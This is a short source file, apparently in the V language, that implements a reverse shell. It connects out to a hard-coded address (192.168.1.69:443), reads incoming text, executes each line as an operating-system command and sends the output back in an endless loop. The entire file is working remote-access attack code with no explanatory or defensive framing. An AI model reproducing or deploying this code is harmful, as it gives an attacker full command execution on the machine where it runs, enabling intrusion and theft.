import net
import os

fn main() {
   getconnected()
}
fn getconnected() {
        mut conn := net.dial_tcp("192.168.1.69:443") or {
        panic(err)
    }
    mut buf := []byte{len: 1024}
    for {
            nbytes := conn.read(mut buf) or {
                panic(err)
            }
            mut received := buf[0..nbytes].bytestr()
            //println('message received:  $received') 
            received = received.replace('\r\n','')
            res := os.exec(received) or {
                panic(err)
            }
            //println(res.output)
            conn.write_str(res.output)
    
    }
    conn.close()
    
}